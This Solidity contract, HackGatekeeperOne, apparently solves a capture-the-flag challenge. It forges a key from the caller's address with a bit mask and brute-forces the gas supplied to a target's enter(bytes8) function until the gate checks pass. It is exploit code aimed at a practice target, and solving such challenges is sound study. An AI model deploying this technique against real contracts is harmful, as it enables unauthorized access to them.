// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackGatekeeperOne {
    constructor() public {}

    event Hacked(uint256 gasBrute);

    function hack(
        address _gatekeeperAddr,
        uint256 _lowerGasBrute,
        uint256 _upperGasBrute
    ) external {
        bytes8 key = bytes8(uint64(msg.sender) & 0xFFFFFFFF0000FFFF);

        bool success;
        uint256 gasBrute;
        for (
            gasBrute = _lowerGasBrute;
            gasBrute <= _upperGasBrute;
            gasBrute++
        ) {
            (success, ) = _gatekeeperAddr.call{gas: (gasBrute + (8191 * 3))}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                break;
            }
        }
        require(success, "HACK FAILED");
        emit Hacked(gasBrute);
    }
}